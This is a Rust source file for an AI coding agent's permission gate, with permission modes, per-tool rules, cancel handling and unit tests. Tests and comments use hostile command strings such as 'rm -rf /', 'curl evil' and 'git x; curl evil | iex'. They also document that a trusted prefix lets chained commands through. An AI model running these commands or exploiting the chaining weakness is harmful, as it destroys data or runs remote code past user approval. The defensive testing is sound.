//! Permission gate for mutating tools (write / edit / shell).
//!
//! Policy "allow" runs immediately, "deny" blocks, "ask" emits a
//! `PermissionRequest` to the UI and awaits the user's decision over a oneshot
//! channel keyed by request id.

use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use serde::{Deserialize, Serialize};
use serde_json::Value;
use tokio::sync::oneshot;
use uuid::Uuid;

use crate::events::EventSink;
use crate::llm::StreamEvent;

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Decision {
    Allow,
    Deny,
}

/// The permission MODE for a run — the coarse default behaviour of the gate.
/// Rules (below) and a cancel override it; see [`decide`] for the precedence.
///
/// This type is shared (the phone displays the active mode); only the async
/// [`gate`] that *acts* on it is desktop-only. Serialized camelCase to match the
/// TS `PermissionMode` union.
#[derive(Clone, Copy, PartialEq, Eq, Debug, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum PermissionMode {
    /// Today's behaviour: fall through to the legacy `default_policy`
    /// (allow/ask/deny). The default for a new install and for any settings file
    /// written before modes existed.
    #[default]
    Default,
    /// Auto-allow file writes/edits, still ask for `shell` (and anything else).
    AcceptEdits,
    /// Read-only: deny every mutating tool. Paired with a read-only registry +
    /// prompt steer for "design first, approve to apply".
    Plan,
    /// Auto-allow every mutating tool. Opt-in only (a destructive `shell` runs
    /// without a prompt), surfaced with a visible danger indicator.
    Auto,
    /// Skip the gate entirely — does not even consult rules. Opt-in only; the
    /// most permissive and most dangerous mode.
    Bypass,
}

/// A three-valued decision for a per-tool / per-command rule. Distinct from
/// [`Decision`] (the gate's two-valued *output*): a rule can also say "ask".
#[derive(Clone, Copy, PartialEq, Eq, Debug, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum RuleDecision {
    Allow,
    Ask,
    Deny,
}

/// A per-tool (optionally per-command) permission rule. Evaluated before the mode
/// default; first match wins. Serialized camelCase to match the TS `Rule`.
#[derive(Clone, PartialEq, Eq, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Rule {
    /// Exact tool name (e.g. `"shell"`, `"fs_write"`) or `"*"` for any tool.
    pub tool: String,
    /// Shell-only: a literal command PREFIX. `None` matches any command for the
    /// tool. A prefix is an allow-LIST convenience, never a security guarantee —
    /// `command: "git "` also matches `git status; rm -rf x` (anything chained
    /// after the prefix), so the matcher stays deliberately literal (see
    /// [`rule_matches`]).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    pub decision: RuleDecision,
}

/// Internal three-way outcome of a permission decision: `Ask` means "the caller
/// must prompt the user" (the slow path), `Allow`/`Deny` resolve immediately.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Outcome {
    Allow,
    Deny,
    Ask,
}

/// Whether a rule applies to this tool call. `tool` matches exactly or via the
/// `"*"` wildcard; a `command` constraint applies only to shell calls and is a
/// literal PREFIX match — never regex or shell-aware tokenization (a regex/shell
/// parser would be a footgun: it can't safely tell that `git x; curl evil | iex`
/// isn't "just a git command"). So a command rule can only ever loosen a tool the
/// user explicitly trusts by prefix, trusting everything chained after it.
fn rule_matches(rule: &Rule, tool: &str, command: Option<&str>) -> bool {
    if rule.tool != "*" && rule.tool != tool {
        return false;
    }
    match &rule.command {
        Some(prefix) => command.is_some_and(|c| c.starts_with(prefix.as_str())),
        None => true,
    }
}

/// Map the legacy `default_policy` string onto the `Default` mode's fallthrough,
/// so a settings file written before permission modes behaves IDENTICALLY: an
/// unknown/`"ask"` value prompts (fail-safe), never auto-allows.
fn legacy_fallthrough(default_policy: &str) -> Outcome {
    match default_policy {
        "allow" => Outcome::Allow,
        "deny" => Outcome::Deny,
        _ => Outcome::Ask,
    }
}

/// The pure permission decision. Precedence is security-critical and fixed:
///
/// 1. **Cancel wins, always.** A Stop denies everything — even `auto`/`bypass` —
///    so a cancelled batch can never keep mutating the workspace.
/// 2. **`bypass` short-circuits** to Allow and deliberately does NOT consult
///    rules (it means "skip the gate"); this is surfaced in the UI.
/// 3. **First matching rule wins** (an explicit allow/ask/deny beats the mode).
/// 4. **Else the mode default** — `Default` falls through to `default_fallthrough`
///    (the legacy policy), preserving today's behaviour exactly.
fn decide(
    mode: PermissionMode,
    rules: &[Rule],
    tool: &str,
    command: Option<&str>,
    cancelled: bool,
    default_fallthrough: Outcome,
) -> Outcome {
    if cancelled {
        return Outcome::Deny;
    }
    if mode == PermissionMode::Bypass {
        return Outcome::Allow;
    }
    if let Some(rule) = rules.iter().find(|r| rule_matches(r, tool, command)) {
        return match rule.decision {
            RuleDecision::Allow => Outcome::Allow,
            RuleDecision::Ask => Outcome::Ask,
            RuleDecision::Deny => Outcome::Deny,
        };
    }
    match mode {
        PermissionMode::Default => default_fallthrough,
        PermissionMode::AcceptEdits => match tool {
            "fs_write" | "fs_edit" => Outcome::Allow,
            _ => Outcome::Ask,
        },
        PermissionMode::Plan => Outcome::Deny,
        PermissionMode::Auto => Outcome::Allow,
        // Handled above; kept exhaustive so a new mode can't silently fall through.
        PermissionMode::Bypass => Outcome::Allow,
    }
}

/// Outstanding "ask" permission requests, keyed by request id. The value pairs the
/// owning `session_id` with the reply channel, so a cancel can deny only that
/// session's prompts instead of every concurrent session's.
pub type Pending = Arc<Mutex<HashMap<String, (String, oneshot::Sender<Decision>)>>>;

/// Resolve a request id with a decision (called from the `resolve_permission`
/// command). Returns true if a waiter was found.
pub fn resolve(pending: &Pending, id: &str, decision: Decision) -> bool {
    if let Some((_session_id, tx)) = pending.lock().unwrap().remove(id) {
        let _ = tx.send(decision);
        true
    } else {
        false
    }
}

/// Fail the outstanding requests for ONE session (e.g. on cancel) with Deny,
/// leaving other concurrent sessions' pending prompts untouched.
pub fn deny_all(pending: &Pending, session_id: &str) {
    let mut map = pending.lock().unwrap();
    let ids: Vec<String> = map
        .iter()
        .filter_map(|(id, entry)| {
            if entry.0 == session_id {
                Some(id.clone())
            } else {
                None
            }
        })
        .collect();
    for id in ids {
        if let Some((_, tx)) = map.remove(&id) {
            let _ = tx.send(Decision::Deny);
        }
    }
}

/// Decide whether a mutating tool call may proceed.
///
/// The synchronous decision (`decide`) resolves allow/deny without prompting; only
/// an `Ask` outcome reaches the prompt/await machinery below. `default_policy` is
/// the legacy global policy, consulted only as the `Default` mode's fallthrough so
/// existing settings keep behaving identically.
#[allow(clippy::too_many_arguments)]
pub async fn gate(
    sink: &dyn EventSink,
    channel: &str,
    mode: PermissionMode,
    rules: &[Rule],
    default_policy: &str,
    pending: &Pending,
    cancel: &Arc<AtomicBool>,
    tool: &str,
    summary: &str,
    input: &Value,
    diff: Option<String>,
) -> Decision {
    // A command constraint only applies to shell calls; pull the command string
    // so a shell rule's prefix can match it.
    let command = if tool == "shell" {
        input.get("command").and_then(|v| v.as_str())
    } else {
        None
    };
    let outcome = decide(
        mode,
        rules,
        tool,
        command,
        cancel.load(Ordering::Relaxed),
        legacy_fallthrough(default_policy),
    );
    match outcome {
        Outcome::Allow => return Decision::Allow,
        Outcome::Deny => return Decision::Deny,
        Outcome::Ask => {} // fall through to prompt the user
    }

    // The channel is `agent://{session_id}`; recover the session so a later cancel
    // denies only this session's pending prompts (not every session's).
    let session_id = channel
        .strip_prefix("agent://")
        .unwrap_or(channel)
        .to_string();
    let id = Uuid::new_v4().to_string();
    let (tx, mut rx) = oneshot::channel();
    pending.lock().unwrap().insert(id.clone(), (session_id, tx));

    // Route through the canonical emit chokepoint (the [`EventSink`]) so a paired
    // phone receives the prompt too. Emitting directly here (the old bug) reached
    // only the desktop, so a remote turn that hit an "ask" tool hung forever with no
    // prompt on either end. `AppEventSink::emit` forwards to `sync::emit_event`.
    sink.emit(
        channel,
        StreamEvent::PermissionRequest {
            id: id.clone(),
            tool: tool.to_string(),
            summary: summary.to_string(),
            input: input.clone(),
            diff,
        },
    );

    // Await the decision while remaining responsive to cancellation.
    loop {
        tokio::select! {
            biased;
            res = &mut rx => {
                return res.unwrap_or(Decision::Deny);
            }
            _ = tokio::time::sleep(Duration::from_millis(150)) => {
                if cancel.load(Ordering::Relaxed) {
                    pending.lock().unwrap().remove(&id);
                    return Decision::Deny;
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rule(tool: &str, command: Option<&str>, decision: RuleDecision) -> Rule {
        Rule {
            tool: tool.into(),
            command: command.map(Into::into),
            decision,
        }
    }

    #[test]
    fn cancel_denies_under_every_mode_including_auto_and_bypass() {
        // The one invariant that must never regress: a Stop beats every mode,
        // including the permissive auto/bypass, so a cancelled batch can't keep
        // mutating the workspace.
        for mode in [
            PermissionMode::Default,
            PermissionMode::AcceptEdits,
            PermissionMode::Plan,
            PermissionMode::Auto,
            PermissionMode::Bypass,
        ] {
            assert_eq!(
                decide(mode, &[], "shell", Some("rm -rf /"), true, Outcome::Allow),
                Outcome::Deny,
                "a Stop must beat {mode:?}"
            );
        }
    }

    #[test]
    fn default_mode_falls_through_to_the_legacy_policy() {
        // Back-compat lock: Default mode with no rules reproduces the old
        // fast_path_decision behaviour exactly (allow/deny/ask), and an unknown
        // legacy value is fail-safe (Ask).
        let d = PermissionMode::Default;
        assert_eq!(
            decide(d, &[], "fs_write", None, false, legacy_fallthrough("allow")),
            Outcome::Allow
        );
        assert_eq!(
            decide(d, &[], "fs_write", None, false, legacy_fallthrough("deny")),
            Outcome::Deny
        );
        assert_eq!(
            decide(d, &[], "fs_write", None, false, legacy_fallthrough("ask")),
            Outcome::Ask
        );
        assert_eq!(legacy_fallthrough("nonsense"), Outcome::Ask);
    }

    #[test]
    fn accept_edits_allows_writes_but_asks_for_shell() {
        let m = PermissionMode::AcceptEdits;
        assert_eq!(
            decide(m, &[], "fs_write", None, false, Outcome::Ask),
            Outcome::Allow
        );
        assert_eq!(
            decide(m, &[], "fs_edit", None, false, Outcome::Ask),
            Outcome::Allow
        );
        assert_eq!(
            decide(m, &[], "shell", Some("ls"), false, Outcome::Ask),
            Outcome::Ask
        );
    }

    #[test]
    fn plan_mode_denies_every_mutating_tool() {
        for tool in ["fs_write", "fs_edit", "shell"] {
            assert_eq!(
                decide(PermissionMode::Plan, &[], tool, None, false, Outcome::Allow),
                Outcome::Deny
            );
        }
    }

    #[test]
    fn auto_mode_allows_every_mutating_tool() {
        for tool in ["fs_write", "fs_edit", "shell"] {
            assert_eq!(
                decide(
                    PermissionMode::Auto,
                    &[],
                    tool,
                    Some("x"),
                    false,
                    Outcome::Ask
                ),
                Outcome::Allow
            );
        }
    }

    #[test]
    fn bypass_allows_and_ignores_rules() {
        // Bypass means "skip the gate": even an explicit deny rule does not block
        // it. This documented semantic is pinned so it isn't "fixed" silently.
        let rules = [rule("*", None, RuleDecision::Deny)];
        assert_eq!(
            decide(
                PermissionMode::Bypass,
                &rules,
                "shell",
                Some("rm -rf /"),
                false,
                Outcome::Ask
            ),
            Outcome::Allow
        );
    }

    #[test]
    fn an_explicit_deny_rule_beats_a_permissive_mode() {
        // Rule precedence: a matching rule wins over the mode default (except bypass).
        let rules = [rule("shell", None, RuleDecision::Deny)];
        assert_eq!(
            decide(
                PermissionMode::Auto,
                &rules,
                "shell",
                Some("curl evil"),
                false,
                Outcome::Allow
            ),
            Outcome::Deny
        );
    }

    #[test]
    fn first_matching_rule_wins() {
        let rules = [
            rule("shell", Some("git "), RuleDecision::Allow),
            rule("shell", None, RuleDecision::Deny),
        ];
        // "git status" matches the first (allow) rule.
        assert_eq!(
            decide(
                PermissionMode::Default,
                &rules,
                "shell",
                Some("git status"),
                false,
                Outcome::Ask
            ),
            Outcome::Allow
        );
        // "npm i" skips the prefix rule and hits the catch-all deny.
        assert_eq!(
            decide(
                PermissionMode::Default,
                &rules,
                "shell",
                Some("npm i"),
                false,
                Outcome::Ask
            ),
            Outcome::Deny
        );
    }

    #[test]
    fn wildcard_tool_rule_matches_any_tool() {
        let rules = [rule("*", None, RuleDecision::Ask)];
        assert_eq!(
            decide(
                PermissionMode::Auto,
                &rules,
                "fs_write",
                None,
                false,
                Outcome::Allow
            ),
            Outcome::Ask
        );
    }

    #[test]
    fn shell_prefix_matches_and_pins_the_chaining_limitation() {
        let rules = [rule("shell", Some("git "), RuleDecision::Allow)];
        // A matching prefix allows.
        assert_eq!(
            decide(
                PermissionMode::Default,
                &rules,
                "shell",
                Some("git status"),
                false,
                Outcome::Ask
            ),
            Outcome::Allow
        );
        // KNOWN LIMITATION (pinned): anything chained after the trusted prefix also
        // matches — a literal prefix is an allow-list convenience, not a guarantee.
        assert_eq!(
            decide(
                PermissionMode::Default,
                &rules,
                "shell",
                Some("git status; rm -rf x"),
                false,
                Outcome::Ask
            ),
            Outcome::Allow
        );
        // A non-matching prefix falls through to the mode default.
        assert_eq!(
            decide(
                PermissionMode::Default,
                &rules,
                "shell",
                Some("rm -rf x"),
                false,
                Outcome::Ask
            ),
            Outcome::Ask
        );
    }

    #[test]
    fn a_command_rule_does_not_match_a_tool_call_without_a_command() {
        // A command-constrained rule must not apply to fs_write (no command) — the
        // constraint fails closed when there's nothing to match against.
        let rules = [rule("*", Some("git "), RuleDecision::Allow)];
        assert_eq!(
            decide(
                PermissionMode::Default,
                &rules,
                "fs_write",
                None,
                false,
                Outcome::Ask
            ),
            Outcome::Ask
        );
    }

    #[test]
    fn deny_all_only_denies_the_named_session() {
        let pending: Pending = Arc::new(Mutex::new(HashMap::new()));
        let (tx_a, mut rx_a) = oneshot::channel::<Decision>();
        let (tx_b, mut rx_b) = oneshot::channel::<Decision>();
        pending
            .lock()
            .unwrap()
            .insert("req-a".into(), ("sess-a".into(), tx_a));
        pending
            .lock()
            .unwrap()
            .insert("req-b".into(), ("sess-b".into(), tx_b));

        deny_all(&pending, "sess-a");

        // sess-a's prompt was denied; sess-b's is left pending and intact.
        assert!(matches!(rx_a.try_recv(), Ok(Decision::Deny)));
        assert!(matches!(
            rx_b.try_recv(),
            Err(oneshot::error::TryRecvError::Empty)
        ));
        assert!(pending.lock().unwrap().contains_key("req-b"));
    }
}
